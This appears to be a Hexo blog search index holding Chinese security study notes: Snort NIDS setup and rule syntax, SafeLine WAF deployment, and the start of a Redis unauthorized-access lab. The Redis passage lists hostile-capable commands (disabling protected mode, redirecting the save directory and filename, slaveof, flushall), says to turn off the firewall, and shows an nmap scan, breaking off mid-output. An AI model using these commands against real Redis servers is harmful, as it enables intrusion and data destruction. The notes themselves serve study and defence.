<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>测试二</title>
      <link href="/2025/04/22/%E6%B5%8B%E8%AF%95%E4%BA%8C/"/>
      <url>/2025/04/22/%E6%B5%8B%E8%AF%95%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p><img src="/%E6%B5%8B%E8%AF%95%E4%BA%8C/sleep-17453309983741.jpg"></p><p><img src="/%E6%B5%8B%E8%AF%95%E4%BA%8C/sleep.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>测试1</title>
      <link href="/2025/04/22/%E6%B5%8B%E8%AF%951/"/>
      <url>/2025/04/22/%E6%B5%8B%E8%AF%951/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/04/22/%E6%B5%8B%E8%AF%951/sleep.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NIDS</title>
      <link href="/2025/04/17/NIDS/"/>
      <url>/2025/04/17/NIDS/</url>
      
        <content type="html"><![CDATA[<p>IDS入侵检测系统</p><p>基于主机的 HIDS：检查网络中计算机上的事件</p><p>基于网络的 NIDS：检查网络网络上的流量恶意问题</p><h2 id="NIDS-Snort"><a href="#NIDS-Snort" class="headerlink" title="NIDS-Snort"></a>NIDS-Snort</h2><p>一个IDS和IPS（入侵防御系统）</p><p>规则库，自写规则，重要</p><p>官方规则：<a href="https://www.snort.org/downloads#rules">Snort Rules and IDS Software Download</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://blog.csdn.net/m0_72892640/article/details/146405167">Ubuntu22.04上Snort3的安装与基本配置 _ubuntu安装snort-CSDN博客</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt install build-essential libpcap-<span class="hljs-built_in">dev</span> libpcre3-<span class="hljs-built_in">dev</span> libnet1-<span class="hljs-built_in">dev</span> zlib1g-<span class="hljs-built_in">dev</span> luajit hwloc libdnet-<span class="hljs-built_in">dev</span> libdumbnet-<span class="hljs-built_in">dev</span> bison flex liblzma-<span class="hljs-built_in">dev</span> openssl libssl-<span class="hljs-built_in">dev</span> pkg-config libhwloc-<span class="hljs-built_in">dev</span> cmake cpputest libsqlite3-<span class="hljs-built_in">dev</span> uuid-<span class="hljs-built_in">dev</span> libcmocka-<span class="hljs-built_in">dev</span> libnetfilter-queue-<span class="hljs-built_in">dev</span> libmnl-<span class="hljs-built_in">dev</span> autotools-<span class="hljs-built_in">dev</span> libluajit<span class="hljs-number">-5.1</span>-<span class="hljs-built_in">dev</span> libunwind-<span class="hljs-built_in">dev</span> -y<br></code></pre></td></tr></table></figure><h4 id="Snort-DAQ（数据采集库）"><a href="#Snort-DAQ（数据采集库）" class="headerlink" title="Snort DAQ（数据采集库）"></a>Snort DAQ（数据采集库）</h4><p>需要root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/snort3/libdaq.git<br><br>生成./configure<br>./bootstrap<br><br>./configure<br>make<br>make install<br></code></pre></td></tr></table></figure><h4 id="snort3"><a href="#snort3" class="headerlink" title="snort3"></a>snort3</h4><p>官方下载源码</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">//</span>进入snort3目录<br><span class="hljs-keyword">cd</span> snort3/          <br><br><span class="hljs-string">//</span>配置snort3<br><span class="hljs-string">./configure_cmake.sh</span> <span class="hljs-params">--prefix=/usr/local</span> <span class="hljs-params">--enable-tcmalloc</span> <br><br>路上缺少的包<br>sudo apt install libpcre2-dev<br>sudo apt install google-perftools libgoogle-perftools-dev<br><br><span class="hljs-string">//</span>进入build目录<br><span class="hljs-keyword">cd</span> build/<br><br><span class="hljs-string">//</span>编译<br>make<br><span class="hljs-string">//</span>安装<br>make install<br></code></pre></td></tr></table></figure><h3 id="配置网络接口"><a href="#配置网络接口" class="headerlink" title="配置网络接口"></a>配置网络接口</h3><p>监听的网卡设置为混杂模式，这里使用Ubuntu系统</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart">ip a <span class="hljs-keyword">show</span><br>ip link <span class="hljs-keyword">set</span> dev ens37 promisc <span class="hljs-keyword">on</span><br><br>ip a <span class="hljs-keyword">show</span> ens37<br></code></pre></td></tr></table></figure><p>前后对比</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">ens37:</span> &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; <br><span class="hljs-symbol">ens37:</span> &lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP&gt; <br></code></pre></td></tr></table></figure><h4 id="禁用网卡-Offload功能"><a href="#禁用网卡-Offload功能" class="headerlink" title="禁用网卡 Offload功能"></a>禁用网卡 Offload功能</h4><p>以防止 Snort 截断大于 1518 字节的大数据包。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">查看是否全为<span class="hljs-keyword">off</span><br>ethtool -k ens37 | grep receive-<span class="hljs-keyword">off</span><br>ethtool -K ens37 gro <span class="hljs-keyword">off</span> lro <span class="hljs-keyword">off</span><br></code></pre></td></tr></table></figure><p>修改是临时的，重启会再次开启</p><h3 id="配置规则集"><a href="#配置规则集" class="headerlink" title="配置规则集"></a>配置规则集</h3><p>社区规则集下载</p><p><a href="https://www.snort.org/downloads#rules">Snort Rules and IDS Software Download</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建默认规则集存放路径</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /usr/local/etc/rules<br><br><span class="hljs-built_in">sudo</span> tar xzf snort3-community-rules.tar.gz -C /usr/local/etc/rules/<br><span class="hljs-built_in">ls</span> /usr/local/etc/rules/snort3-community-<br>rules/           <br><span class="hljs-comment"># AUTHORS  LICENSE  sid-msg.map  snort3-community.rules  VRT-License.txt</span><br></code></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>snort/snort.lua<br></code></pre></td></tr></table></figure><p>ips栏目添加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">include</span>=<span class="hljs-string">&#x27;/usr/local/etc/rules/snort3-community-rules/snort3-community.rules&#x27;</span>,<br></code></pre></td></tr></table></figure><p>字段之间必须用逗号隔开</p><p><img src="/2025/04/17/NIDS/image-20250417114054005.png" alt="image-20250417114054005"></p><p>检测配置是否正确</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snort -c /usr/local/etc/snort/snort.lua<br></code></pre></td></tr></table></figure><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>可以参考，我们安装是snort3</p><p><a href="https://blog.csdn.net/hexf9632/article/details/94715434">Snort命令行参数详解-CSDN博客</a></p><p>常用配置文件及目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">配置文件<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>snort/snort.lua<br><br>规则目录<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>rules<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/local/bin/snort -c /usr/local/etc/snort/snort.lua -s 65535 -k none -l /var/log/snort -D -i ens33 -m 0x1b -u snort -g snort<br></code></pre></td></tr></table></figure><p>参数 | 含义<br>-i <interface> | 指定监听的网络接口<br>-c <file> | 指定配置文件<br>-A <mode> | 设置报警模式（例如 alert_fast）<br>-l <dir> | 指定日志目录<br>-K <mode> | 指定日志格式（如 ascii, pcap）</p><h3 id="自写规则"><a href="#自写规则" class="headerlink" title="自写规则"></a>自写规则</h3><p><a href="https://blog.csdn.net/weixin_44813582/article/details/105918523">snort2.9规则-学习笔记_snort规则库-CSDN博客</a><br><a href="https://www.cnblogs.com/moshen8/p/17842216.html">Snort3: 规则语法规范(三) - 魔神八号 - 博客园</a></p><p>可借助AI</p><p>规则实例</p><p><img src="/2025/04/17/NIDS/8b4230f3310140ebef98790720144cc7.png"></p><h4 id="规则动作"><a href="#规则动作" class="headerlink" title="规则动作"></a>规则动作</h4><p>也支持自定义的规则</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">alert 警报并记录<br><span class="hljs-keyword">pass</span> 忽略<br><span class="hljs-built_in">log</span> 记录<br>activation 报警并启动另一个动态规则链<br>dynamic 由其他规则包调用<br></code></pre></td></tr></table></figure><h4 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h4><p>核心支持的协议</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">ip</span> 检查<span class="hljs-built_in">IP</span>分片攻击，<span class="hljs-built_in">IP</span>协议号异常流量<br>icmp Ping洪水攻击，ICMP重定向<br>tcp 检测HTTP，SSH，FTP等基于TCP的协议流量<br>udp 检测DNS，DHCP，QUIC等<br></code></pre></td></tr></table></figure><p>其他协议</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">IPv6<br>SCTP<br>GRE<br>ICMPv6<br></code></pre></td></tr></table></figure><h4 id="数据包的来源和目标地址"><a href="#数据包的来源和目标地址" class="headerlink" title="数据包的来源和目标地址"></a>数据包的来源和目标地址</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">源<span class="hljs-built_in">ip</span> 端口 &lt;&gt; 目标<span class="hljs-built_in">ip</span> 端口<br>网络层不需要写端口<br></code></pre></td></tr></table></figure><h4 id="ip表示"><a href="#ip表示" class="headerlink" title="ip表示"></a>ip表示</h4><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">any 全部<br>$EXTERNAL_NET 预定义变量，外部网络IP<br><span class="hljs-number">192.168.8.0</span>/<span class="hljs-number">24</span> C类地址<br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>,<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> 多个C类地址<br>!<span class="hljs-string">[192.168.2.0/24,192.168.8.0/24]</span> 不包括<br></code></pre></td></tr></table></figure><h4 id="端口表示"><a href="#端口表示" class="headerlink" title="端口表示"></a>端口表示</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">:1024表示比1024小，包含1024的所有端口<br><span class="hljs-section">1000: 表示比1000大，包括1000的所有端口</span><br>!53 不是53端口<br>错误：53,54<br><span class="hljs-section">正确：53:54</span><br></code></pre></td></tr></table></figure><h4 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h4><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">-&gt; 左为源头，右为目标<br>&lt;&gt; 双向<br></code></pre></td></tr></table></figure><p>检测从外部访问者到服务器的请求（如 HTTP 请求）：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">alert tcp $EXTERNAL_NET any -&gt; $HOME_NET <span class="hljs-number">80</span> (msg:<span class="hljs-string">&quot;Inbound HTTP Request&quot;</span>; <span class="hljs-params">...</span>)<br></code></pre></td></tr></table></figure><p>检测服务器对客户端的响应（如 HTTP 响应）：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">alert tcp $HOME_NET <span class="hljs-number">80</span> -&gt; $EXTERNAL_NET any (msg:<span class="hljs-string">&quot;Outbound HTTP Response&quot;</span>; <span class="hljs-params">...</span>)<br></code></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="msg"><a href="#msg" class="headerlink" title="msg"></a>msg</h5><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">保存到日志中的信息<br><span class="hljs-symbol">msg:</span><span class="hljs-string">&quot;find sqlmap attack&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h5 id="content"><a href="#content" class="headerlink" title="content"></a>content</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">检测内容<br></code></pre></td></tr></table></figure><h5 id="nocase"><a href="#nocase" class="headerlink" title="nocase"></a>nocase</h5><p>不区分大小写</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h2 id="NIDS-Suricata"><a href="#NIDS-Suricata" class="headerlink" title="NIDS-Suricata"></a>NIDS-Suricata</h2><p>Suricata是一个高性能的网络IDS、IPS和网络安全监控引擎。它是开源的，由一个社区经营的非营利性基金会，开放的信息安全基金会所有。</p><p><a href="https://www.osgeo.cn/suricata/quickstart.html">官方文档Suricata 7.0.0</a></p><p><a href="https://www.osgeo.cn/suricata/rules/index.html">6. 司法规则 — Suricata 7.0.0-dev 文档</a></p><p>看到文档很完善，想在服务器装一个，服务器装不起，一直报错，docker装也崩了。</p><h2 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h2><p>后面补一下，安装真的崩溃了，花了大量时间，还没成功。</p><p>其实主要是学习一下规则的书写，写规则要了解攻击的流量来完善规则的检测条件</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NIDS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>雷池waf</title>
      <link href="/2025/04/17/waf/"/>
      <url>/2025/04/17/waf/</url>
      
        <content type="html"><![CDATA[<h2 id="雷池"><a href="#雷池" class="headerlink" title="雷池"></a>雷池</h2><p>长亭的语义waf</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;/data/safeline&quot;</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/data/safeline&quot;</span><br>wget <span class="hljs-string">&quot;https://waf-ce.chaitin.cn/release/latest/compose.yaml&quot;</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/data/safeline&quot;</span><br><span class="hljs-built_in">touch</span> <span class="hljs-string">&quot;.env&quot;</span><br><br>vim .<span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure><p>写入配置文件，其实不需要大改，主要是tag和系统架构ARCH_SUFFIX</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SAFELINE_DIR</span>=/data/safeline<br><span class="hljs-attribute">IMAGE_TAG</span>=latest<br><span class="hljs-attribute">MGT_PORT</span>=9443<br><span class="hljs-attribute">POSTGRES_PASSWORD</span>=yourpassword #-------（自定义密码使用数字+英文大小写组合，勿使用特殊字符）<br><span class="hljs-attribute">SUBNET_PREFIX</span>=172.22.222<br><span class="hljs-attribute">IMAGE_PREFIX</span>=swr.cn-east-3.myhuaweicloud.com/chaitin-safeline<br>ARCH_SUFFIX=<br>RELEASE=<br>REGION=<br></code></pre></td></tr></table></figure><p>启动</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose up -d</span><br></code></pre></td></tr></table></figure><p>初始化账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> safeline-mgt resetadmin<br></code></pre></td></tr></table></figure><h3 id="添加web应用"><a href="#添加web应用" class="headerlink" title="添加web应用"></a>添加web应用</h3><p>官方演示</p><p><a href="https://rivers.chaitin.cn/discussion/ct6mia31s5rumkn52sp0#%E9%9B%B7%E6%B1%A0%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">站点配置演示（代理已有站点） | 长亭百川云</a></p><p>雷池基于 <code>Nginx</code> 进行开发, 作为 <code>反向代理</code> 接入网络</p><p><img src="/2025/04/17/waf/image-20250417195929538-17448931341979.png" alt="image-20250417195929538"></p><ul><li>域名: 通过雷池访问该应用时使用的域名 (支持使用 <code>*</code> 做为通配符)，注意修改 DNS 解析到雷池 IP</li><li>端口: 雷池监听的端口 (如需配置 HTTPS 服务, 请勾选 SSL 选项并配置对应的 SSL 证书)</li><li>上游服务器: 被保护的 Web 服务的实际地址</li></ul><p>域名解析到安装雷池waf的ip，端口则是访问网站时的端口。</p><p>访问网站时，访问域名:端口，雷池waf则作为反向代理接入访问上游服务器</p><h4 id="本地演示"><a href="#本地演示" class="headerlink" title="本地演示"></a>本地演示</h4><p>cmd管理员权限启动，打开hosts文件解析到</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">notepad <span class="hljs-name">C</span>:\Windows\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure><p><img src="/2025/04/17/waf/image-20250417200244020-174489313419710.png" alt="image-20250417200244020"></p><p>192.168.251.222是phpstudy启动的一个web服务。</p><p><img src="/2025/04/17/waf/image-20250417200645567-174489313419711.png" alt="image-20250417200645567"></p><p>直接访问192.168.251.222，并不会增加访问量，访问zkn.cmc</p><p><img src="/2025/04/17/waf/image-20250417201743202-174489313419712.png" alt="image-20250417201743202"></p><p>携带恶意数据访问</p><p><img src="/2025/04/17/waf/image-20250417201708714-174489313419713.png" alt="image-20250417201708714"></p><p>识别到攻击日志</p><p><img src="/2025/04/17/waf/image-20250417201800142-174489313419714.png" alt="image-20250417201800142"></p><p>如果<strong>直接访问</strong>上游服务器，雷池waf是不能拦截的</p><h3 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h3><p>CC防护，防御ddos和爬虫</p><p>人机验证</p><p>身份认证</p><h3 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h3><p>总之，雷池waf还是一款配置简单，功能强大的安全设备</p><p>AI的趣味</p><p>WAF 不是真的“墙”，只是门口的保安</p><p>WAF 拦截的前提是：</p><ul><li>所有流量必须经过它</li><li>它才能分析、判断、阻断</li></ul><p>🛡️ 所以真正安全的做法是：</p><ul><li>把后端服务的端口“藏”起来（127.0.0.1 或防火墙限制 IP）</li><li>只让雷池能访问后端，任何外部访问都必须经过 WAF</li><li>甚至可以配合 nginx，做多层代理 + 白名单控制</li></ul><p>🧱架构示意图</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">📡 Client<br>   │<br>   ▼<br>🌐 <span class="hljs-selector-attr">[雷池 WAF (端口: 80/443)]</span>   ←←←←←←←←←← 只有它对外开放<br>   │<br>   ▼<br>📦 <span class="hljs-selector-attr">[Nginx (监听 localhost:80)]</span>     ← 仅供雷池访问<br>   │<br>   ▼<br>🛠️ <span class="hljs-selector-attr">[后端服务 (监听 localhost:8080)]</span> ← 仅供 Nginx 访问<br></code></pre></td></tr></table></figure><p>Nginx配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">127.0.0.1:80</span>;<br><br>    <span class="hljs-section">location</span> /api/ &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:8080;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis漏洞复现</title>
      <link href="/2025/04/17/Redis/"/>
      <url>/2025/04/17/Redis/</url>
      
        <content type="html"><![CDATA[<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p>非关系性数据库，内存数据存储系统，以键值对（key-value）的形式存储数据，用作数据库、缓存和消息队列。</p><p>Redis 的特点：<br>✅ 基于内存，速度极快：<br>所有数据都存储在内存中，读写速度非常快，适合做缓存使用。</p><p>✅ 支持多种数据结构：<br>不仅仅是字符串，复杂结构的操作也非常方便。</p><p>✅ 持久化：<br>虽然在内存中运行，但可以将数据定期保存到磁盘，以防丢失。</p><p>✅ 支持发布&#x2F;订阅：<br>可以作为轻量级的消息中间件使用。</p><p>✅ 分布式支持：<br>通过主从复制、哨兵机制、集群等方式可以进行横向扩展和高可用部署。</p><p>Redis 常作为 <strong>数据库（如MySQL） 的加速层</strong> 使用。它可以显著减少数据库压力，提升系统响应速度。</p><p>默认使用6379端口</p><h3 id="redis常用命令"><a href="#redis常用命令" class="headerlink" title="redis常用命令"></a>redis常用命令</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> xz <span class="hljs-string">&quot;Hacker&quot;</span>                     # 设置键xz的值为字符串Hacker<br><span class="hljs-built_in">get</span> xz                              # 获取键xz的内容<br><span class="hljs-built_in">SET</span> score 857                       # 设置键score的值为857<br>INCR score                          # 使用INCR命令将score的值增加1<br><span class="hljs-built_in">GET</span> score                           # 获取键score的内容<br>keys *                              # 列出当前数据库中所有的键<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> protected-mode <span class="hljs-literal">no</span>        # 关闭安全模式<br><span class="hljs-built_in">get</span> anotherkey                      # 获取一个不存在的键的值<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/redis          # 设置保存目录<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb     # 设置保存文件名<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">get</span> dir                      # 查看保存目录<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">get</span> dbfilename               # 查看保存文件名<br>save                                # 进行一次备份操作<br>flushall                            # 删除所有数据<br>del key                             # 删除键为key的数据<br>slaveof<span class="hljs-built_in"> ip port </span>                    # 设置主从关系<br>redis-cli -h<span class="hljs-built_in"> ip </span>-p 6379 -a passwd   # 外部连接<br><span class="hljs-built_in">info</span> #查看redis的信息和服务器信息<br></code></pre></td></tr></table></figure><blockquote><p>1.使用SET和GET命令，可以完成基本的赋值和取值操作；<br>2.Redis是不区分命令的大小写的，set和SET是同一个意思；<br>3.使用keys *可以列出当前数据库中的所有键；<br>4.当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；<br>5.如果键的值中有空格，需要使用双引号括起来，如”Hello World”.</p></blockquote><h3 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h3><p>未授权是后续攻击的前提</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#requirepass foobared 可以使用空密码</span><br></code></pre></td></tr></table></figure><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>centos</p><p>Redis &lt;&#x3D; 5.0.5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://download.redis.io/releases/redis-2.8.17.tar.gz<br>tar -zxvf redis-2.8.17.tar.gz<br><span class="hljs-built_in">cd</span> redis-2.8.17/<br>make<br><span class="hljs-built_in">cd</span> src<br>./redis-cli -h<br><span class="hljs-built_in">sudo</span> make install<br>make <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>关闭防火墙,不然有可能打不进去，所以说防火墙还是有点东西的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">永久关闭<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">disable</span> firewalld<br>停止，重启时启动<br><span class="hljs-built_in">sudo</span> systemctl stop firewalld<br></code></pre></td></tr></table></figure><p>启动服务</p><p>src目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./redis-server ../redis.conf<br></code></pre></td></tr></table></figure><p>探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p 6379 -script redis-info 192.168.88.155<br></code></pre></td></tr></table></figure><p>扫描出东西，没关闭防火墙，可能只扫的出6379端口</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Starting Nmap <span class="hljs-number">7.94</span>SVN <span class="hljs-punctuation">(</span> https<span class="hljs-punctuation">:</span><span class="hljs-comment">//nmap.org ) at 2025-04-15 05:17 EDT</span><br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">88.155</span><br>Host is up <span class="hljs-punctuation">(</span><span class="hljs-number">0.00026</span>s 